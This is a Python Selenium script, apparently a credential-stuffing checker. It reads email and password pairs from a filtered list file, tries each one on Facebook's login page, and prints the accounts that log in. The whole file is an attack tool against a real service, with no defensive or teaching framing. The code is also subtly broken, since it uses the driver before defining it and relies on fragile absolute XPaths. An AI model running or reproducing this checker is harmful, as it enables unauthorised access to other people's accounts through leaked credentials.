from lib2to3.pgen2 import driver
from time import sleep
from xml.dom.minidom import Element
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

BD = open("Filtrados.txt","r").read()
lines = BD.splitlines()

Wait5 = WebDriverWait(driver,5)
driver = webdriver.Chrome(executable_path="./chromedriver")
driver.maximize_window()
driver.get("https://www.facebook.com/")

LoginSuccess=0
for i in range(0,len(lines),2):
    email=lines[i]
    psw=lines[i+1]
    driver.find_element(By.XPATH,"//*[@id='email']").send_keys(email)
    driver.find_element(By.XPATH,"//*[@id='pass']").send_keys(psw)
    driver.find_element(By.XPATH,"//*[@id='u_0_d_BX']").click()
    if driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div[1]/div/div/div[1]/div/div/div[1]/ul/li/div/a"):
        LoginSuccess+=1
        print("Inicio de Sesion logrado con: ",email)
        driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[2]/div[4]/div[1]/span/div/div[1]/svg").click()
        element = Wait5.until(EC.element_to_be_clickable((By.XPATH,"/html/body/div[1]/div/div[1]/div/div[2]/div[4]/div[2]/div/div[2]/div[1]/div[1]/div/div/div/div/div/div/div/div/div[1]/div/div/div[1]/div[3]/div/div[4]/div/div[1]/div[2]/div/div/div/div/span")))
        driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[2]/div[4]/div[2]/div/div[2]/div[1]/div[1]/div/div/div/div/div/div/div/div/div[1]/div/div/div[1]/div[3]/div/div[4]/div/div[1]/div[2]/div/div/div/div/span").click()
    else:
        print("F con: ",email)

driver.quit()